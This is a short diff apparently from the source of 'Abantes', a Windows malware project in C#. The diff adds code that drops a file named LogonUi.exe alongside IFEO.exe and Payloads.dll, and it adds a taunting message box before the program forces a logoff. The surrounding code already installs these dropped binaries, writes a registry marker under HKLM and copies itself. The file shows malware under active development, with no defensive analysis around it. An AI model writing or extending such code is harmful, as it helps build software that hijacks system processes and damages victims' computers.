@@ -35,6 +35,7 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
                 File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
                 File.WriteAllBytes(extractPath + "\\Rules.exe", Resources.Rules);
+                File.WriteAllBytes(extractPath + "\\LogonUi.exe", Resources.LogonUI);
                 Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
@@ -192,7 +193,11 @@ namespace Abantes
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Abantes");
                 editKey.SetValue("AbantesWasHere", "1");
                 editKey.Close();
+
+                MessageBox.Show("Abantes Wants To Meet You","I Want Too Meet You");
+
                 Thread.Sleep(1000);
+
                 Others.StartProcess("shutdown.exe", "/l /f");
             }
             else
